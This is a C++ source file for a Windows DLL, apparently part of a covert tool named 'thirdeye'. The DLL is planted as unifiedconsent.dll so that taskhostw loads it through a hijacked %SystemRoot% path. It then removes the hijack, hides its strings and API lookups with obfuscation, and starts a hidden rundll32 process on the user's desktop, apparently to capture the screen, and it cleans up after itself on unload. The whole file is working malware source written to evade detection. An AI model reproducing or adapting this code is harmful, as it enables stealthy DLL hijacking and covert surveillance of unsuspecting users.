#include "thirdeye_core.h"
#include "internal.h"
#include "dynresolve.h"
#include <windows.h>

extern "C" void TeAutoCleanIfOwned(void);

// When planted under an alternate module name and loaded by taskhostw, re-host
// on the interactive desktop via rundll32 (BitBlt needs a real desktop).

static bool WideEqICase(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = *a, cb = *b;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return false;
        ++a; ++b;
    }
    return *a == 0 && *b == 0;
}

static const wchar_t* FileBase(const wchar_t* path) {
    const wchar_t* base = path;
    for (const wchar_t* p = path; *p; ++p) {
        if (*p == L'\\' || *p == L'/') base = p + 1;
    }
    return base;
}

static bool BaseMatchesObf(const wchar_t* path, const char* expectA) {
    wchar_t expect[64];
    TeAsciiToWide(expect, 64, expectA);
    return WideEqICase(FileBase(path), expect);
}

static bool IsPlantedProxy(HMODULE hModule) {
    wchar_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(hModule, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return false;
    static constexpr auto o = MAKE_OBF("unifiedconsent.dll");
    return BaseMatchesObf(path, DECR_STR(o));
}

static bool HostIsTaskhostw() {
    wchar_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(nullptr, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return false;
    static constexpr auto o = MAKE_OBF("taskhostw.exe");
    return BaseMatchesObf(path, DECR_STR(o));
}

static bool HostIsRundll32() {
    wchar_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(nullptr, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return false;
    static constexpr auto o = MAKE_OBF("rundll32.exe");
    return BaseMatchesObf(path, DECR_STR(o));
}

typedef BOOL(WINAPI* pCreateProcessW)(
    LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

static void SpawnSessionHost(HMODULE hModule) {
    static constexpr auto obfK = MAKE_OBF("kernel32.dll");
    static constexpr auto oCp = MAKE_OBF("CreateProcessW");
    HMODULE hK = DynGetOrLoad(DECR_STR(obfK));
    auto fnCreate = hK ? ResolveApiT<pCreateProcessW>(hK, DECR_STR(oCp)) : nullptr;
    if (!fnCreate) return;

    wchar_t dllPath[MAX_PATH];
    if (!GetModuleFileNameW(hModule, dllPath, MAX_PATH)) return;

    wchar_t sysDir[MAX_PATH];
    UINT sn = GetSystemDirectoryW(sysDir, MAX_PATH);
    if (sn == 0 || sn >= MAX_PATH) return;

    wchar_t cmd[MAX_PATH * 4];
    int n = 0;
    cmd[n++] = L'"';
    for (UINT i = 0; i < sn && n < MAX_PATH * 4 - 8; ++i) cmd[n++] = sysDir[i];

    wchar_t r32[32];
    static constexpr auto oR32 = MAKE_OBF("\\rundll32.exe\"");
    TeAsciiToWide(r32, 32, DECR_STR(oR32));
    for (const wchar_t* p = r32; *p && n < MAX_PATH * 4 - 8; ++p) cmd[n++] = *p;

    cmd[n++] = L' ';
    cmd[n++] = L'"';
    for (const wchar_t* p = dllPath; *p && n < MAX_PATH * 4 - 32; ++p) cmd[n++] = *p;
    cmd[n++] = L'"';
    cmd[n++] = L',';

    wchar_t entry[32];
    static constexpr auto oEntry = MAKE_OBF("TeSessionEntry");
    TeAsciiToWide(entry, 32, DECR_STR(oEntry));
    for (const wchar_t* p = entry; *p && n < MAX_PATH * 4 - 2; ++p) cmd[n++] = *p;
    cmd[n] = 0;

    wchar_t desktop[32];
    static constexpr auto oDesk = MAKE_OBF("winsta0\\default");
    TeAsciiToWide(desktop, 32, DECR_STR(oDesk));

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    if (fnCreate(nullptr, cmd, nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static LONG g_spawned = 0;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            if (IsPlantedProxy(hModule) && HostIsTaskhostw()) {
                if (InterlockedCompareExchange(&g_spawned, 1, 0) == 0) {
                    SpawnSessionHost(hModule);
                    // Hijack only needed to load us; drop it before anything else
                    // (COM+) resolves %SystemRoot%\Registration via TEMP.
                    Uc83DisarmSystemRoot();
                }
            }
            break;
        case DLL_PROCESS_DETACH:
            if (!HostIsRundll32() && !(IsPlantedProxy(hModule) && HostIsTaskhostw())) {
                TeAutoCleanIfOwned();
            }
            (void)lpReserved;
            break;
        default:
            break;
    }
    return TRUE;
}

extern "C" {

__declspec(dllexport) void CALLBACK TeSessionEntry(HWND, HINSTANCE, LPSTR, int) {
    TeSessionMain();
}

}
